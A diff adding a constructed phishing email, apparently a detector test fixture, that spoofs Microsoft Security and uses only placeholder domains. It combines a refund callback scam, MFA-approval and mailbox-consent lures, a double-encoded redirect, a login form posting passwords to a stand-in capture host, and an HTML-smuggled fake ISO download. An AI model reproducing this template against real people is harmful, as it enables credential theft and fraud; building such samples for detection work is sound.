@@ -1,0 +1,16 @@
+From: Microsoft Security <billing-alert@unrelated-example.test>
+To: analyst@example.test
+Subject: Urgent subscription and identity verification
+Message-ID: <notice-8821@mailer-other.test>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+<html><body>
+<p>Your security subscription renewed for USD 499. Call +1 (202) 555-0198 immediately for a refund.</p>
+<p>Approve the MFA login request, then grant permission access for this application to read your mailbox.</p>
+<p>Scan the QR code to verify your login or <a href="https://accounts-example.test/continue?next=https%253A%252F%252Fcredential-capture.test%252Fsignin">continue securely</a>.</p>
+<form action="https://credential-capture.test/session"><input type="email" name="user"><input type="password" name="password"></form>
+<script>const payload = atob('SGVsbG8='); const file = new Blob([payload]); URL.createObjectURL(file);</script>
+<a download="Security_Update.iso" href="data:application/octet-stream;base64,SGVsbG8=">Download update</a>
+<p>References: https://example.org/help https://support.example.net/advice https://status.example.edu/notice</p>
+</body></html>
